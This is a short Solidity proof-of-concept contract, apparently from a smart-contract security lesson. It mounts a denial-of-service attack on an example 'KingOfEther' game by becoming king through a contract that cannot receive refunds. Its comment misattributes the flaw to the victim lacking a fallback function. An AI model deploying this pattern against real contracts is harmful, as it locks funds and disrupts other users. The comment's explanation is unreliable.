// SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

import "./KingOfEther.sol";

// The Attack contract takes advantage of the KingOfEther contract's lack of a fallback function to execute a DoS attack.

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = _kingOfEther;
    }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }

}